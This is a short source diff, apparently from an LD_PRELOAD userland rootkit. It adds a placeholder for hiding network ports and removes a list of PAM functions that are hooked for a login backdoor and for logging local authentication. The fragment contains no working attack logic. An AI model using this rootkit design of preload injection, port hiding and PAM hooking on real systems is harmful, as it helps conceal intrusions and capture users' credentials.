@@ -10,13 +10,9 @@
 #define BDVLSO "??BDVLSO??"
 #define SOPATH "??SOPATH??"
 #define LDSO_PRELOAD "??LDSO_PRELOAD??"
+#define HIDEPORTS "??HIDEPORTS??"
 
 typedef struct symbol_struct {
     void *(*func)();
 } syms;
 
-/* i'mma just put this in here... */
-#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
-#define LIBPAM_CALLS_SIZE 7
-static char *libpam_calls[LIBPAM_CALLS_SIZE] = {"pam_syslog","pam_vsyslog","pam_authenticate","pam_open_session","pam_acct_mgmt","pam_prompt","pam_vprompt"};
-#endif
